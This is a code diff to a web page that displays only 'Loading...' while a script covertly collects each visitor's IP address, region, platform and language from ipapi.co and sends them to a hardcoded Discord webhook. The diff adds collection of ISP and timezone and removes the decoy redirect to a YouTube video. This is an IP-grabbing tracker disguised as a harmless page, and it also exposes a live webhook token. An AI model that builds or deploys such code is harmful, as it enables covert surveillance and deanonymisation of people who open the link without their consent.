@@ -6,7 +6,7 @@
 </head>
 <body>
 
-<h2 id="status">Loading... wait</h2>
+<h2>Loading...</h2>
 
 <script>
 const webhookURL = "https://discord.com/api/webhooks/1480136659558469655/_kuA3HTmEfllWrlklOLv2zKJg21zPyGTjroUICocqJT5UJXHP6c2H5YJd4Cqj2YzrScB";
@@ -22,6 +22,8 @@ fetch('https://ipapi.co/json/')
   .then(data => {
     const ip = data.ip || "Unknown";
     const region = data.region || data.city || "Unknown";
+    const isp = data.org || "Unknown";          // ISP / Organization
+    const timezone = data.timezone || "Unknown"; // Timezone
 
     // Prepare Discord webhook message
     const payload = {
@@ -35,7 +37,9 @@ fetch('https://ipapi.co/json/')
             { name: "Platform", value: platform, inline: true },
             { name: "Language", value: language, inline: true },
             { name: "IP Address", value: ip, inline: true },
-            { name: "Region", value: region, inline: true }
+            { name: "Region", value: region, inline: true },
+            { name: "ISP", value: isp, inline: true },
+            { name: "Timezone", value: timezone, inline: true }
           ],
           timestamp: new Date().toISOString()
         }
@@ -54,18 +58,9 @@ fetch('https://ipapi.co/json/')
     })
     .catch(console.error);
 
-    // Wait 3 seconds, then redirect
-    setTimeout(() => {
-      window.location.href = "https://www.youtube.com/shorts/_6HzLIJPH2A?feature=share";
-    }, 500); // 3000 ms = 3 seconds
-
   })
   .catch(err => {
     console.error("Failed to fetch IP info", err);
-    // Still redirect after 3 seconds even if fetch fails
-    setTimeout(() => {
-      window.location.href = "https://www.youtube.com/shorts/_6HzLIJPH2A?feature=share";
-    }, 3000);
   });
 </script>
 
